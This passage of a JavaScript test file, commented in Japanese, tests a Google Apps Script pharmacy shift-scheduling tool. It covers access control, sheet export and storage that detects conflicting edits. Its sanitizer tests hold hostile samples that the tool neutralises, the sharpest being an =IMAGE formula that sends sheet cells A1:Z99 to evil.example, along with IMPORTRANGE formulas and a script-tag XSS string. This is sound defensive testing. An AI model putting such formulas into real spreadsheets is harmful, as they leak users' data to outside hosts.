    { name: 'A', order: 1 },
    { name: 'Z', order: '' },      // 空欄は最後
    { name: 'B', order: 1 },       // A と同順 → 元の並びのまま A の次
    { name: 'Y', order: 'あ' },    // 数値でない → 最後
  ]);
  assert.deepStrictEqual(sorted.map(function (x) { return x.name; }),
    ['A', 'B', 'C', 'Z', 'Y']);
});

test('シフトパターンの初期値が種別ごとに揃っている', function () {
  const seed = Array.from(sandbox.PATTERN_MASTER.SEED);
  const kinds = {};
  seed.forEach(function (row) {
    const kind = row[sandbox.PATTERN_MASTER.COL_KIND - 1];
    kinds[kind] = (kinds[kind] || 0) + 1;
  });

  assert.strictEqual(kinds[sandbox.PATTERN_MASTER.KIND_WORK], 3, '出勤は ○ ● ▲ の3つ');
  assert.strictEqual(kinds[sandbox.PATTERN_MASTER.KIND_OFF], 5, '休みは5つ');
  assert.strictEqual(kinds[sandbox.PATTERN_MASTER.KIND_NOTE], undefined,
    '★備考はシフトパターンに混ぜない（備考マスタが持つ）');

  // 初期値の記号が Config の定義と食い違っていないか
  const workSyms = seed
    .filter(function (r) { return r[4] === sandbox.PATTERN_MASTER.KIND_WORK; })
    .map(function (r) { return r[0]; });
  assert.deepStrictEqual(workSyms, ['○', '●', '▲']);

  const offSyms = seed
    .filter(function (r) { return r[4] === sandbox.PATTERN_MASTER.KIND_OFF; })
    .map(function (r) { return r[0]; });
  assert.deepStrictEqual(offSyms, Array.from(sandbox.SYM.OFF_ALL),
    '休み記号は Config の SYM.OFF_ALL と一致する');
});

test('備考マスタが備考スタンプを持つ', function () {
  const seed = Array.from(sandbox.NOTE_MASTER.SEED);
  assert.ok(seed.length >= 1, '初期値がある');
  assert.strictEqual(seed[0][sandbox.NOTE_MASTER.COL_TEXT - 1], '銀行');

  // 備考はシフト記号ではない。ここが混ざると入力欄の集計に紛れ込む
  assert.strictEqual(sandbox.isShiftSymbol('銀行'), false);
});

test('備考スタンプはマスタが無くても既定が出る', function () {
  // シフトパターンには既定があるのに備考だけ無く、
  // 「不足シートを生成」を実行するまで銀行が出なかった
  const list = Array.from(sandbox.defaultNoteStamps_());
  assert.ok(list.length >= 1, 'マスタ無しでも候補がある');
  assert.strictEqual(list[0].text, '銀行');
  assert.ok(list[0].desc !== '', '説明も付く');
});

test('医師名には既定を置かない（実名をコードに書かないため）', function () {
  // 備考と違い、医師名は登録されるまで出ないのが正しい。
  // Config に実名の既定が紛れ込んでいないことを縛る
  const configText = fs.readFileSync(path.join(ROOT, 'Config.gs'), 'utf8');
  const start = configText.indexOf('const DOCTOR_MASTER');
  assert.ok(start >= 0, 'DOCTOR_MASTER が定義されている');
  // その定義ブロックだけを切り出して見る。後ろの別マスタの SEED を拾わないため
  const block = configText.slice(start, configText.indexOf('});', start));
  assert.strictEqual(block.indexOf('SEED'), -1, '医師マスタに初期値を持たせない');
});

// ---- Web アプリの集計（シートの数式に頼らない） -----------------------

/** WebApp の内部が使う view を偽物で作る */
function fakeView(rows, opts) {
  const o = opts || {};
  const L = sandbox.LAYOUT;
  const layout = {
    headerRow: 1, dateRow: 2, weekRow: 3,
    doctorTop: 4, doctorBottom: 8,
    repeatDateRow: 10, gridTop: 11, gridBottom: 10 + rows.length,
    noteRow: 10 + rows.length + 2, docRow: 10 + rows.length + 4,
    pharmRow: 10 + rows.length + 5, shortageRow: 10 + rows.length + 6,
    firstCol: L.COL_FIRST, lastCol: L.COL_FIRST + (rows[0].length - 1),
  };

  const maxRow = layout.shortageRow;
  const maxCol = L.COL_KIND_WORK;
  const values = [];
  for (let r = 0; r < maxRow; r++) {
    values.push(new Array(maxCol).fill(''));
  }
  // 氏名・区分・入力欄
  rows.forEach(function (row, i) {
    const r = layout.gridTop + i - 1;
    values[r][0] = 'P' + i;
    values[r][L.COL_KIND_WORK - 1] = (o.kinds && o.kinds[i]) || sandbox.KIND.PHARM;
    row.forEach(function (v, k) { values[r][L.COL_FIRST + k - 1] = v; });
  });
  // 医師数の行
  (o.docCounts || []).forEach(function (n, k) {
    values[layout.docRow - 1][L.COL_FIRST + k - 1] = n;
  });

  return {
    layout: layout,
    values: values,
    display: values,
    formulas: values.map(function (r) { return r.map(function () { return ''; }); }),
    paidSyms: o.paidSyms || '有休,夏休',
    reqPlus: o.reqPlus === undefined ? 1 : o.reqPlus,
    at: function (grid, row, col) { return this[grid][row - 1][col - 1]; },
  };
}

test('出力ファイル名が実物の命名に合う', function () {
  // さくら薬局北口店R08.09月シフト.pdf の形。店名はテストでも出さない
  assert.strictEqual(
    sandbox.buildExportFileName_('X薬局Y店', 2026, 9), 'X薬局Y店R08.09月シフト',
    '和暦2桁・月2桁のゼロ詰め');
  assert.strictEqual(
    sandbox.buildExportFileName_('X薬局Y店', 2026, 12), 'X薬局Y店R08.12月シフト');
  assert.strictEqual(
    sandbox.buildExportFileName_('X薬局Y店', 2019, 1), 'X薬局Y店R01.01月シフト',
    '令和元年は R01');
  assert.strictEqual(
    sandbox.buildExportFileName_('  X薬局Y店 ', 2026, 9), 'X薬局Y店R08.09月シフト',
    '店名の前後の空白は落とす');
});

test('出力ファイル名は扱えない年月をそのまま通さない', function () {
  // 投げる前に console.error へ出す作りなので、テスト中だけ黙らせる
  const real = sandbox.console.error;
  sandbox.console.error = function () {};
  try {
    assert.throws(function () { sandbox.buildExportFileName_('X', 2018, 1); },
      /令和元年より前/, '令和より前は和暦が変わるので通さない');
    assert.throws(function () { sandbox.buildExportFileName_('X', 2026, 0); }, /月が不正/);
    assert.throws(function () { sandbox.buildExportFileName_('X', 2026, 13); }, /月が不正/);
  } finally {
    sandbox.console.error = real;
  }
});

test('warekiYear_ は令和の年を2桁で返す', function () {
  assert.strictEqual(sandbox.warekiYear_(2019), '01');
  assert.strictEqual(sandbox.warekiYear_(2026), '08');
  assert.strictEqual(sandbox.warekiYear_(2028), '10', '2桁になっても切らない');
});

// ---- アクセス制御（Auth.gs） -----------------------------------------
//
// 原則: 画面から来た店舗 ID・社員 ID・権限は信用しない。
// 誰であるかは Session が決め、何をしてよいかは社員マスタが決める。

const MEMBERS = [
  { id: 's1', name: 'A', email: 'Ippan@Example.com', role: 'staff', stores: ['st1'] },
  { id: 's2', name: 'B', email: 'mgr@example.com', role: 'manager', stores: ['st1'] },
  { id: 's3', name: 'C', email: 'mgr2@example.com', role: 'manager', stores: ['st1', 'st2'] },
  { id: 's4', name: 'D', email: 'admin@example.com', role: 'admin', stores: [] },
  { id: 's5', name: 'E', email: 'gone@example.com', role: 'manager', stores: ['st1'], retired: true },
  { id: 's6', name: 'F', email: 'broken', role: 'admin', stores: ['st1'] },
  { id: 's7', name: 'G', email: 'weird@example.com', role: '社長', stores: ['st1'] },
];
const ALL_STORES = ['st1', 'st2', 'st3'];

// 拒否は console.error に出す作りなので、テスト中だけ黙らせる
const quiet = function (fn) {
  const real = sandbox.console.error;
  sandbox.console.error = function () {};
  try { return fn(); } finally { sandbox.console.error = real; }
};

test('メールアドレスは大文字小文字と空白を無視して照合する', function () {
  const u = sandbox.resolveUser_(MEMBERS, '  IPPAN@example.COM ');
  assert.strictEqual(u.id, 's1');
  assert.strictEqual(u.email, 'ippan@example.com', '正規化した形で持つ');
});

test('未登録のアカウントは弾く', function () {
  quiet(function () {
    assert.throws(function () { sandbox.resolveUser_(MEMBERS, 'nobody@example.com'); },
      /登録されていません/);
  });
});

test('実行ユーザーを特定できないときは弾く（デプロイ設定の誤り）', function () {
  quiet(function () {
    assert.throws(function () { sandbox.resolveUser_(MEMBERS, ''); },
      /アクセスしているユーザーとして実行/);
  });
});

test('退職者は行が残っていても通さない', function () {
  quiet(function () {
    assert.throws(function () { sandbox.resolveUser_(MEMBERS, 'gone@example.com'); },
      /登録されていません/);
  });
});

test('メールの形が壊れている行は通さない', function () {
  quiet(function () {
    assert.throws(function () { sandbox.resolveUser_(MEMBERS, 'broken'); },
      /登録されていません/);
  });
});

test('知らない権限は最弱（staff）に倒す', function () {
  const u = sandbox.resolveUser_(MEMBERS, 'weird@example.com');
  assert.strictEqual(u.role, sandbox.ROLE.STAFF, '「社長」を admin と読まない');
  assert.strictEqual(sandbox.canEdit_(u, 'st1'), false);
});

test('staff は自店を見られるが書けない', function () {
  const u = sandbox.resolveUser_(MEMBERS, 'ippan@example.com');
  assert.strictEqual(sandbox.canRead_(u, 'st1'), true);
  assert.strictEqual(sandbox.canEdit_(u, 'st1'), false);
  assert.strictEqual(sandbox.canEditMaster_(u), false);
});

test('manager は自店だけ書ける。他店は読むこともできない', function () {
  const u = sandbox.resolveUser_(MEMBERS, 'mgr@example.com');
  assert.strictEqual(sandbox.canEdit_(u, 'st1'), true);
  assert.strictEqual(sandbox.canRead_(u, 'st2'), false, '他店は見えない');
  assert.strictEqual(sandbox.canEdit_(u, 'st2'), false);
  assert.strictEqual(sandbox.canEditMaster_(u), false, 'マスタは admin だけ');
});

test('複数店の manager は持ち店だけ書ける', function () {
  const u = sandbox.resolveUser_(MEMBERS, 'mgr2@example.com');
  assert.strictEqual(sandbox.canEdit_(u, 'st1'), true);
  assert.strictEqual(sandbox.canEdit_(u, 'st2'), true);
  assert.strictEqual(sandbox.canEdit_(u, 'st3'), false);
});

test('admin は所属が空でも全店を扱える', function () {
  const u = sandbox.resolveUser_(MEMBERS, 'admin@example.com');
  assert.strictEqual(sandbox.canEdit_(u, 'st3'), true);
  assert.strictEqual(sandbox.canEditMaster_(u), true);
  assert.deepStrictEqual(sandbox.visibleStores_(u, ALL_STORES), ALL_STORES);
});

test('店舗を指さない読み出しは許さない', function () {
  const u = sandbox.resolveUser_(MEMBERS, 'mgr@example.com');
  assert.strictEqual(sandbox.canRead_(u, ''), false);
  assert.strictEqual(sandbox.canRead_(u, null), false);
  assert.strictEqual(sandbox.canRead_(u, undefined), false);
});

test('画面から来た店舗IDは、実在かつ権限のあるものだけ通す', function () {
  const u = sandbox.resolveUser_(MEMBERS, 'mgr@example.com');
  assert.strictEqual(sandbox.requireStore_(u, 'st1', ALL_STORES), 'st1');
  quiet(function () {
    assert.throws(function () { sandbox.requireStore_(u, 'st2', ALL_STORES); },
      /権限がありません/, '実在するが持っていない店');
    assert.throws(function () { sandbox.requireStore_(u, 'st9', ALL_STORES); },
      /権限がありません/, '実在しない店');
    assert.throws(function () { sandbox.requireStore_(u, '', ALL_STORES); },
      /権限がありません/, '空を既定値に読み替えない');
  });
});

test('書き込みの門は、権限が無ければ必ず投げる', function () {
  const staff = sandbox.resolveUser_(MEMBERS, 'ippan@example.com');
  quiet(function () {
    assert.throws(function () { sandbox.assertCanEdit_(staff, 'st1'); }, /編集する権限/);
    assert.throws(function () { sandbox.assertCanEdit_(null, 'st1'); }, /編集する権限/);
    assert.throws(function () { sandbox.assertCanRead_(null, 'st1'); }, /閲覧する権限/);
  });
  const mgr = sandbox.resolveUser_(MEMBERS, 'mgr@example.com');
  assert.strictEqual(sandbox.assertCanEdit_(mgr, 'st1'), true);
});

// ---- 数式インジェクション（Sanitize.gs） -------------------------------
//
// シートに書く値はデータではなくコードになりうる。しかも開いた人の権限で動く。

test('数式になる先頭文字は無効化する', function () {
  const f = sandbox.cellSafe_;
  assert.strictEqual(f('=IMPORTRANGE("id","A1")').charAt(0), "'");
  assert.strictEqual(f('+1+1'), "'+1+1");
  assert.strictEqual(f('-1'), "'-1");
  assert.strictEqual(f('@SUM(A1)'), "'@SUM(A1)");
});

test('外へ送る数式も止まる（IMAGE を使う手口）', function () {
  const v = '=IMAGE("https://evil.example/?d="&ENCODEURL(JOIN(",",A1:Z99)))';
  const out = sandbox.cellSafe_(v);
  assert.strictEqual(out.charAt(0), "'", '先頭が数式として解釈されない');
  assert.strictEqual(out.slice(1), v, '中身は変えない');
});

test('ふつうの入力は変えない', function () {
  const f = sandbox.cellSafe_;
  assert.strictEqual(f('公休'), '公休');
  assert.strictEqual(f('▲遅番'), '▲遅番');
  assert.strictEqual(f(''), '');
  assert.strictEqual(f(null), '');
  assert.strictEqual(f(3), 3, '数値はそのまま');
  assert.strictEqual(f(true), true);
});

test('制御文字は落とす（タブ始まりも数式になる）', function () {
  const f = sandbox.cellSafe_;
  assert.strictEqual(f('\t=1+1'), "'=1+1", 'タブを落としたあと数式判定に掛ける');
  assert.strictEqual(f('公\u0000休'), '公休', 'NUL を落とす');
  assert.strictEqual(f('a\rb'), 'ab');
});

test('長すぎる入力は切る', function () {
  const long = 'あ'.repeat(sandbox.CELL_MAX_LEN + 100);
  assert.strictEqual(sandbox.cellSafe_(long).length, sandbox.CELL_MAX_LEN);
});

test('二次元配列をまとめて通せる', function () {
  const out = sandbox.cellSafeGrid_([['=A1', '公休'], [null, 3]]);
  assert.deepStrictEqual(out, [["'=A1", '公休'], ['', 3]]);
});

test('残っている数式を読み出し側で見つける', function () {
  quiet(function () {
    const hits = sandbox.findFormulas_([['', ''], ['', '=IMPORTRANGE("x","A1")']], 'シフト');
    assert.strictEqual(hits.length, 1);
    assert.strictEqual(hits[0].row, 1);
    assert.strictEqual(hits[0].col, 1);
    assert.throws(function () {
      sandbox.assertNoFormulas_([['=1+1']], 'シフト');
    }, /取り込みを中止/);
  });
  assert.strictEqual(sandbox.assertNoFormulas_([['', ''], ['', '']], 'シフト'), true);
});

test('HTML に埋める文字列は必ず逃がす', function () {
  assert.strictEqual(sandbox.escapeHtml_('<script>alert(1)</script>'),
    '&lt;script&gt;alert(1)&lt;/script&gt;');
  assert.strictEqual(sandbox.escapeHtml_(String.fromCharCode(34) + String.fromCharCode(39) + '&'),
    '&quot;&#39;&amp;');
});

// ---- 画面から来た値の検証 ---------------------------------------------

test('記号はマスタにあるものだけ通す', function () {
  const ok = ['○', '▲', '公休'];
  assert.strictEqual(sandbox.requireSymbol_('▲', ok), '▲');
  assert.strictEqual(sandbox.requireSymbol_('', ok), '', '消す操作は通す');
  quiet(function () {
    assert.throws(function () { sandbox.requireSymbol_('=1+1', ok); }, /登録されていない/);
    assert.throws(function () { sandbox.requireSymbol_('△', ok); }, /登録されていない/);
  });
});

test('行キーは書ける行の一覧と突き合わせる', function () {
  const keys = ['s001', 'doc1', 'note'];
  assert.strictEqual(sandbox.requireRowKey_('doc1', keys), 'doc1');
  quiet(function () {
    assert.throws(function () { sandbox.requireRowKey_('agg', keys); }, /書き込めない行/);
    assert.throws(function () { sandbox.requireRowKey_('', keys); }, /書き込めない行/);
  });
});

test('年月日は範囲外を黙って丸めない', function () {
  // vm の中で作った object は deepStrictEqual が通らない（別レルムの Object）
  const ym = sandbox.requireYearMonth_(2026, 9);
  assert.strictEqual(ym.year, 2026);
  assert.strictEqual(ym.month, 9);
  assert.throws(function () { sandbox.requireYearMonth_(2026, 13); }, /扱えない月/);
  assert.throws(function () { sandbox.requireYearMonth_(1999, 1); }, /扱えない年/);
  assert.strictEqual(sandbox.requireDay_(2026, 2, 28), 28);
  assert.throws(function () { sandbox.requireDay_(2026, 2, 30); }, /2月に 30 日はありません/);
  assert.throws(function () { sandbox.requireDay_(2026, 9, 0); }, /はありません/);
});

// ---- スプレッドシートへの出力 -----------------------------------------
//
// 実際にシートへ書く唯一の道なので、偽のシートを当てて、
// 「何回・どこへ・何を」書いたかを見る。
// セル単位で書いていないこと（Tier 2/3）と、数式を無効化していること
// （画面から来た "=IMPORTRANGE(...)" がそのまま数式になるのを止める）が要点。

// 実行ログも同じブックに書くので、シートごとに別々に記録する。
// 1つにまとめると、ログの書き込みが出力の回数に混ざる
function fakeSpreadsheet() {
  const bySheet = {};
  const order = [];
  function makeSheet(name) {
    const calls = { setValues: 0, setBackgrounds: 0, merges: [], widths: [], heights: 0 };
    const range = {
      setValues: function (v) { calls.values = v; calls.setValues++; return range; },
      setBackgrounds: function (v) { calls.backs = v; calls.setBackgrounds++; return range; },
      setFontWeights: function (v) { calls.weights = v; return range; },
      setFontFamilies: function (v) { calls.families = v; return range; },
      setFontSizes: function (v) { calls.sizes = v; return range; },
      setHorizontalAlignment: function (v) { calls.hAlign = v; return range; },
      setVerticalAlignment: function (v) { calls.vAlign = v; return range; },
      setBorder: function () { calls.border = true; return range; },
      setValue: function () { return range; },
      merge: function () { return range; },
      getValues: function () { return [[]]; },
    };
    const sheet = {
      getName: function () { return name; },
      getSheetId: function () { return 123; },
      getLastRow: function () { return 0; },
      getLastColumn: function () { return 0; },
      getMaxRows: function () { return 1000; },
      appendRow: function () { return sheet; },
      getRange: function (r, c, n, w) {
        if (n === 1) calls.merges.push([r, c, w]);        // 結合に使う1行の範囲
        else if (n) calls.box = [r, c, n, w];
        return range;
      },
      setRowHeight: function () { calls.heights++; return sheet; },
      setRowHeights: function (r, n) { calls.heights++; calls.hRows =
        (calls.hRows || 0) + n; return sheet; },
      setColumnWidth: function (c, px) { calls.widths.push([c, 1, px]); return sheet; },
      setColumnWidths: function (c, n, px) { calls.widths.push([c, n, px]); return sheet; },
      setHiddenGridlines: function () { return sheet; },
      setFrozenRows: function (n) { calls.frozen = n; return sheet; },
      deleteRows: function () { return sheet; },
    };
    bySheet[name] = { sheet: sheet, calls: calls };
    order.push(name);
    return sheet;
  }
  const ss = {
    getUrl: function () { return 'https://example.invalid/ss'; },
    getNumSheets: function () { return order.length; },
    getSheetByName: function (n) { return bySheet[n] ? bySheet[n].sheet : null; },
    insertSheet: function (n) { return makeSheet(n); },
  };
  return {
    ss: ss,
    get sheets() { return order.filter(function (n) { return /シフト/.test(n); }); },
    callsFor: function (n) { return bySheet[n].calls; },
  };
}

function withFakeSs(fn) {
  const fake = fakeSpreadsheet();
  const keep = sandbox.SpreadsheetApp.getActive;
  sandbox.SpreadsheetApp.getActive = function () { return fake.ss; };
  try {
    const out = fn(fake);
    return { out: out, fake: fake, calls: fake.callsFor(out.sheetName) };
  } finally { sandbox.SpreadsheetApp.getActive = keep; }
}

const cellOf = function (v, o) {
  return Object.assign({ v: v, num: false, bg: null, name: false, span: 1 }, o);
};
const MODEL_OUT = {
  title: 'R8.8月',
  quota: '土日公休10回',
  store: 'さくら薬局北口店',
  legend: ['○早番　10:00〜19:00'],
  marks: [{ color: '#a9d18e', label: '薬品発注担当' }],
  memo: ['【休憩について】13時〜14時'],
  cols: 5, dayCols: 3,
  year: 2026, month: 8,
  rows: [
    { kind: 'date', cells: [cellOf('医師名', { name: true }), cellOf('1', { bg: '#b8c6da' }),
                            cellOf('2'), cellOf('3'), cellOf('公休')] },
    { kind: 'band', cells: [cellOf('薬剤師', { name: true, span: 5 }), null, null, null, null] },
    { kind: 'body', cells: [cellOf('薬剤師 1', { name: true }), cellOf('公休'),
                            cellOf('○', { bg: '#a9d18e' }), cellOf(''), cellOf('11', { num: true })] },
  ],
};

test('出力は範囲ごとに1回だけ書く（セル単位で回さない）', function () {
  const r = withFakeSs(function () { return sandbox.exportModelToSheet_(MODEL_OUT); });
  assert.strictEqual(r.calls.setValues, 1, '値の書き込みが1回でない');
  assert.strictEqual(r.calls.setBackgrounds, 1, '色の書き込みが1回でない');
  // 38列×40行をセル単位で回すと 1,500 往復になり、6分の制限に触れる
  assert.deepStrictEqual(r.calls.box.slice(0, 2), [1, 1], '左上から書いていない');
  assert.strictEqual(r.calls.box[3], 5, '列数が合わない');
});

test('新しいシートを挿す。既にある表は触らない', function () {
  const r = withFakeSs(function () { return sandbox.exportModelToSheet_(MODEL_OUT); });
  assert.strictEqual(r.fake.sheets.length, 1, 'シートを1枚だけ作る');
  assert.strictEqual(r.fake.sheets[0], 'さくら薬局北口店R08.08月シフト',
    'ファイル名の規則と同じ名前になっていない');
  assert.strictEqual(r.out.sheetName, r.fake.sheets[0]);
  assert.ok(/#gid=/.test(r.out.url), 'シートの URL を返していない');
});

test('同じ月を2回出しても、前のシートを消さない', function () {
  const fake = fakeSpreadsheet();
  const keep = sandbox.SpreadsheetApp.getActive;
  sandbox.SpreadsheetApp.getActive = function () { return fake.ss; };
  try {
    sandbox.exportModelToSheet_(MODEL_OUT);
    sandbox.exportModelToSheet_(MODEL_OUT);
  } finally { sandbox.SpreadsheetApp.getActive = keep; }
  // 配ったあとに作り直すことがある。上書きすると、どちらを配ったか分からなくなる
  assert.deepStrictEqual(fake.sheets,
    ['さくら薬局北口店R08.08月シフト', 'さくら薬局北口店R08.08月シフト (2)']);
});

test('画面から来た文字列は、シートで数式にならない', function () {
  const evil = JSON.parse(JSON.stringify(MODEL_OUT));
  evil.rows[2].cells[1].v = '=IMPORTRANGE("他所のブック","A1")';
  evil.rows[2].cells[3].v = '@SUM(A1)';
  evil.memo = ['=1+1'];
  const r = withFakeSs(function () { return sandbox.exportModelToSheet_(evil); });
  const flat = [].concat.apply([], r.calls.values).map(String);
  flat.forEach(function (v) {
    assert.ok(!/^[=+@]/.test(v), '数式として入る値が残っている: ' + v);
  });
  // 消すのではなく無効化する。中身は読めるままにしておく
  assert.ok(flat.indexOf('\'=IMPORTRANGE("他所のブック","A1")') >= 0,
    '中身まで消してしまっている');
});

test('画面で付いていた色が、そのままシートの塗りになる', function () {
  const r = withFakeSs(function () { return sandbox.exportModelToSheet_(MODEL_OUT); });
  const flat = [].concat.apply([], r.calls.backs);
  assert.ok(flat.indexOf('#b8c6da') >= 0, '土曜の色が落ちている');
  assert.ok(flat.indexOf('#a9d18e') >= 0, '色の印が落ちている');
});

test('列幅は日付列と集計列で分ける（実物の計測どおり）', function () {
  const r = withFakeSs(function () { return sandbox.exportModelToSheet_(MODEL_OUT); });
  const w = r.calls.widths;
  assert.strictEqual(w.length, 3, '氏名・日付・集計の3回で済ませていない');
  assert.deepStrictEqual(w[0].slice(0, 2), [1, 1], '氏名列');
  assert.deepStrictEqual(w[1].slice(0, 2), [2, 3], '日付列（dayCols ぶん）');
  assert.deepStrictEqual(w[2].slice(0, 2), [5, 1], '集計列');
  assert.ok(w[1][2] < w[0][2], '日付列が氏名列より広い');
});

test('区分の帯は右端まで結合する', function () {
  const r = withFakeSs(function () { return sandbox.exportModelToSheet_(MODEL_OUT); });
  const wide = r.calls.merges.filter(function (m) { return m[2] === 5; });
  assert.ok(wide.length >= 1, '帯が右端まで結合されていない');
});

test('凡例の色は、色だけのセルで出す', function () {
  const r = withFakeSs(function () { return sandbox.exportModelToSheet_(MODEL_OUT); });
  const rows = r.calls.values;
  const i = rows.findIndex(function (row) { return row[1] === '薬品発注担当'; });
  assert.ok(i >= 0, '色の凡例が出ていない');
  assert.strictEqual(rows[i][0], '', '見本セルに文字を入れている');
  assert.strictEqual(r.calls.backs[i][0], '#a9d18e', '見本セルが塗られていない');
});

test('表が空でも落ちない', function () {
  const empty = Object.assign({}, MODEL_OUT, { rows: [], legend: [], marks: [], memo: [] });
  const r = withFakeSs(function () { return sandbox.exportModelToSheet_(empty); });
  assert.ok(r.out.rows >= 1, '行が1つも無い');
});

test('中身の無い指示は断る', function () {
  quiet(function () {
    assert.throws(function () { sandbox.exportModelToSheet_(null); }, /表の中身がありません/);
    assert.throws(function () { sandbox.exportModelToSheet_({}); }, /表の中身がありません/);
  });
});

test('行の高さは、同じ値が続くところをまとめて渡す', function () {
  const r = withFakeSs(function () { return sandbox.exportModelToSheet_(MODEL_OUT); });
  // 1行ずつ呼ぶと 40 往復になる。ほとんどの行は同じ高さ
  assert.ok(r.calls.heights < r.out.rows,
    '行ごとに呼んでいる（' + r.calls.heights + ' 回 / ' + r.out.rows + ' 行）');
  assert.strictEqual(r.calls.hRows, r.out.rows, '高さを入れ損ねた行がある');
});

test('列幅と行高の換算', function () {
  assert.strictEqual(sandbox.exportColPx_(5.5), 44);     // 日付列
  assert.strictEqual(sandbox.exportColPx_(12.4), 92);    // 氏名列
  assert.strictEqual(sandbox.exportRowPx_(18), 24);      // 既定の行高
});

const STORE_DB_FILE_ = 'masters.json';

// ---- 複数の PC から編集する（Store.gs）--------------------------------
//
// 保存は Drive の JSON ファイル。読んだときの版（rev）と今の版を突き合わせ、
// 違っていたら書かない。ここが緩いと、2人目の保存で1人目の編集が消える。

// 偽のスプレッドシート。保存は隠しシートの1行なので、行の中身を持てば足りる
function fakeSs() {
  const rows = [['名前', '版', '更新時刻', '更新者']];
  const sheet = {
    getLastRow: () => rows.length,
    getLastColumn: () => rows.reduce((n, r) => Math.max(n, r.length), 4),
    setFrozenRows: () => sheet,
    hideSheet: () => sheet,
    protect: () => ({ setDescription: () => ({ setWarningOnly: () => {} }) }),
    getRange: (r, c, nr, nc) => ({
      getValues: () => {
        const out = [];
        for (let i = 0; i < nr; i++) {
          const src = rows[r - 1 + i] || [];
          const line = [];
          for (let j = 0; j < nc; j++) line.push(src[c - 1 + j] === undefined ? '' : src[c - 1 + j]);
          out.push(line);
        }
        return out;
      },
      setValues: v => {
        for (let i = 0; i < v.length; i++) {
          const at = r - 1 + i;
          while (rows.length <= at) rows.push([]);
          for (let j = 0; j < v[i].length; j++) rows[at][c - 1 + j] = v[i][j];
        }
        return { setFontWeight: () => {} };
      },
      setFontWeight: () => ({}),
    }),
  };
  let made = null;
  const ss = {
    getSheetByName: n => (made === n ? sheet : null),
    insertSheet: n => { made = n; return sheet; },
  };
  return { ss: ss, rows: rows, sheet: sheet };
}

function withDrive(fn) {
  const d = fakeSs();
  const keepSs = sandbox.SpreadsheetApp.getActive;
  const keepLock = sandbox.LockService;
  const keepSession = sandbox.Session;
  sandbox.SpreadsheetApp.getActive = () => d.ss;
  sandbox.LockService = {
    getScriptLock: () => ({ tryLock: () => true, releaseLock: () => {} }),
  };
  sandbox.Session = { getActiveUser: () => ({ getEmail: () => 'a@example.com' }) };
  try { return { out: fn(d), drive: d }; }
  finally {
    sandbox.SpreadsheetApp.getActive = keepSs;
    sandbox.LockService = keepLock;
    sandbox.Session = keepSession;
  }
}

test('まだ無い名前は rev 0 と null', function () {
  const r = withDrive(function () { return sandbox.storeRead_(STORE_DB_FILE_); });
  assert.strictEqual(r.out.rev, 0);
  assert.strictEqual(r.out.data, null);
});

test('書いたものが読み戻せる。版は1つ上がる', function () {
  withDrive(function () {
    const w = sandbox.storeWrite_(STORE_DB_FILE_, 0, { staff: [1, 2] }, false);
    assert.strictEqual(w.ok, true);
    assert.strictEqual(w.rev, 1);
    const r = sandbox.storeRead_(STORE_DB_FILE_);
    assert.strictEqual(r.rev, 1);
    assert.deepStrictEqual(Array.from(r.data.staff), [1, 2]);
    assert.strictEqual(r.updatedBy, 'a@example.com');
    assert.ok(r.updatedAt, '時刻が入っていない');
  });
});

test('古い版で書こうとしたら、書かずに今の中身を返す', function () {
  withDrive(function () {
    sandbox.storeWrite_('m', 0, { v: 'A さんの編集' }, false);   // rev 1
    // B さんは rev 0 のときに読んでいた
    const w = sandbox.storeWrite_('m', 0, { v: 'B さんの編集' }, false);
    assert.strictEqual(w.ok, false, '上書きしてしまった');
    assert.strictEqual(w.rev, 1);
    assert.strictEqual(w.conflict.data.v, 'A さんの編集', '今の中身を返していない');
    assert.strictEqual(w.conflict.updatedBy, 'a@example.com', '誰の編集か返していない');
    // 中身は A さんのまま
    assert.strictEqual(sandbox.storeRead_('m').data.v, 'A さんの編集');
  });
});

test('force を付けたときだけ上書きする', function () {
  withDrive(function () {
    sandbox.storeWrite_('m', 0, { v: 'A' }, false);
    const w = sandbox.storeWrite_('m', 0, { v: 'B' }, true);
    assert.strictEqual(w.ok, true);
    assert.strictEqual(w.rev, 2, '版は進める（次の人がまた衝突を検知できる）');
    assert.strictEqual(sandbox.storeRead_('m').data.v, 'B');
  });
});

test('続けて書けば版が積み上がる', function () {
  withDrive(function () {
    let rev = 0;
    for (let i = 0; i < 5; i++) rev = sandbox.storeWrite_('m', rev, { i: i }, false).rev;
    assert.strictEqual(rev, 5);
    assert.strictEqual(sandbox.storeRead_('m').data.i, 4);
  });
});

test('壊れた中身を「無い」扱いにしない', function () {
  // 「無い」として扱うと、次の保存で内容を消してしまう
  quiet(function () {
    withDrive(function (d) {
      sandbox.storeWrite_('m', 0, { v: 1 }, false);
      d.rows[1][4] = '{壊れている';
      assert.throws(function () { sandbox.storeRead_('m'); }, /JSON として読めません/);
    });
  });
});

test('5万文字を超える中身は、右の列へ分けて入れる', function () {
  withDrive(function (d) {
    const big = { memo: 'あ'.repeat(60000) };
    sandbox.storeWrite_('m', 0, big, false);
    assert.ok(d.rows[1].length > 5, '1セルに詰め込んでいる');
    d.rows[1].slice(4).forEach(function (c) {
      assert.ok(String(c).length <= 50000, 'セルの上限を超えた: ' + String(c).length);
    });
    assert.strictEqual(sandbox.storeRead_('m').data.memo.length, 60000);
  });
});

test('短くなったとき、古い断片が後ろに残らない', function () {
  withDrive(function () {
    sandbox.storeWrite_('m', 0, { memo: 'あ'.repeat(60000) }, false);
    sandbox.storeWrite_('m', 1, { memo: '短い' }, false);
    // 残っていると JSON の後ろにゴミが付いて読めなくなる
    assert.strictEqual(sandbox.storeRead_('m').data.memo, '短い');
  });
});

test('保存データのシートは隠し、手書きには警告を出す', function () {
  // 非表示は事故を防ぐだけで、隠すことにはならない
  //（「表示 → 非表示のシート」で誰でも開ける）。行を消されると保存が壊れる
  const f = sandbox.storeSheet_.toString();
  assert.ok(/hideSheet\(\)/.test(f), '隠していない');
  assert.ok(/CONFIG\.SHEET_DATA/.test(f), 'シート名を直書きしている');
  assert.ok(/setWarningOnly\(true\)/.test(f), '手書きへの警告が無い');
  // 完全な保護にすると、実行ユーザー本人が書けなくなる
  assert.ok(!/setWarningOnly\(false\)/.test(f), '保護が強すぎる');
});

test('保存の単位は 店舗×年月。別の月とはぶつからない', function () {
  assert.strictEqual(sandbox.storeCellsFile_('st1', '2026-10'), 'cells-st1-2026-10');
  assert.notStrictEqual(sandbox.storeCellsFile_('st1', '2026-10'),
    sandbox.storeCellsFile_('st1', '2026-11'));
  assert.notStrictEqual(sandbox.storeCellsFile_('st1', '2026-10'),
    sandbox.storeCellsFile_('st2', '2026-10'));
});

test('画面から来た店舗 ID と年月は、そのままファイル名にしない', function () {
